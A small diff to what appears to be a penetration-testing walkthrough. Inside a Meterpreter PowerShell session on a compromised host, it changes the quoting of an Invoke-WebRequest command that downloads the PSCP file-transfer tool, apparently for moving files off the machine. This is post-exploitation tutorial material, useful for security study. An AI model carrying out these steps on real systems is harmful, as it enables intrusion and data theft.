@@ -461,7 +461,7 @@ meterpreter > powershell_shell
 Then start to download `PSCP` using the following command:
 
 ```bash
-Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe -OutFile .\pscp.exe
+Invoke-WebRequest -Uri https://the.earth.li/'~sgtatham/'putty/latest/w64/pscp.exe -OutFile .\pscp.exe
 ```
 
 Once downloaded, exit to the <kb>powershell</kb> module since we need to load the <kb>cmd</kb> or <kb>shell</kb> module in order for `PSCP` to execute properly:
